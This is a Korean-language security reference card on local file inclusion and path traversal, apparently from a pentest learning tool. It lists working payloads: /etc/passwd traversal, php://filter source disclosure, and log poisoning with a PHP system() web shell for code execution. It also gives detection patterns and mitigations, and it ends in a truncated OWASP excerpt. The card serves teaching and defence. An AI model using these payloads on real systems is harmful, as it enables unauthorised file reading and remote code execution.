# 학습 시드(심화): lfi

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn lfi`. P1: 머신별 라이트업 미참조.

## 개요
로컬 파일 포함 / 경로순회: 입력으로 서버 파일 포함·읽기. RFI·로그오염으로 RCE 확장. CWE-98/22.

## 핵심 기법 · 열거
- 경로순회: ../../../etc/passwd, 인코딩(%2e)·이중인코딩·널바이트(구버전)
- PHP 래퍼: php://filter/convert.base64-encode/resource=index.php (소스유출)
- data://·php://input 로 코드 실행
- 로그오염 RCE: /var/log/apache2/access.log 에 PHP 삽입 후 포함
- /proc/self/environ·세션파일 포함

## 표준 도구 · 명령
```
<url>?page=../../../../etc/passwd
<url>?page=php://filter/convert.base64-encode/resource=config
<url>?page=/var/log/apache2/access.log   # UA 에 <?php system($_GET[c]);?>
ffuf -u '<url>?page=FUZZ' -w lfi-wordlist.txt
```

## 블루팀 탐지
요청에 ../·%2e·php://·/etc/passwd·로그경로. 웹프로세스의 로그파일 비정상 읽기.

## 완화
basename()·허용목록·open_basedir·래퍼 비활성·입력 정규화후 기준경로 검증.

- 출처(검증): https://owasp.org/www-community/attacks/Path_Traversal

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### OWASP Path Traversal
- 출처: https://owasp.org/www-community/attacks/Path_Traversal
- 승격일: 2026-10-07
- 요약: Path Traversal Overview A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to fil
